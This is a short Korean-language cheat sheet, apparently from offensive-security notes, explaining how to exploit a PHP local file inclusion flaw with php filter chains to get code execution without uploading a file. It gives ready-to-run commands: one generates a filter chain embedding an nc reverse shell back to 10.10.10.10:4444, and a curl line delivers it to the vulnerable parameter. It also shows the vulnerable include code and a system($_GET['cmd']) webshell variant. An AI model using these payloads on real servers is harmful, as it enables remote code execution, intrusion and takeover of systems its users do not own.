# php filter chain webshell

LFI 지점(`include($_GET['file'])` 등)이 있을 때, 파일 업로드 없이 php filter chain만으로 PHP 코드를 실행한다. `allow_url_include`가 꺼져 있어도 동작한다 (php://filter는 로컬 스트림이라 제외 대상이 아니다). 도구: php_filter_chain_generator (PayloadsAllTheThings).

## 사용법

```bash
# 1) 실행할 PHP 코드로 체인 생성 (리버스 셸을 싣는다)
python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f"); ?>' | grep '^php' > chain.txt

# 2) LFI 파라미터에 체인 문자열 전달 (URL 인코딩은 curl이 맡는다)
curl -s -G "http://target/index.php" --data-urlencode "file=$(cat chain.txt)"
```

```php
<?php include($_GET['file']); ?>    // 대상 코드 형태
```

- 체인에 `<?php system($_GET['cmd']); ?>`를 넣으면 웹셸이 되지만, include가 다시 실행되어야 하므로 리버스 셸을 싣는 쪽이 확실하다 → [../reverse-shell/README.md](../reverse-shell/README.md)
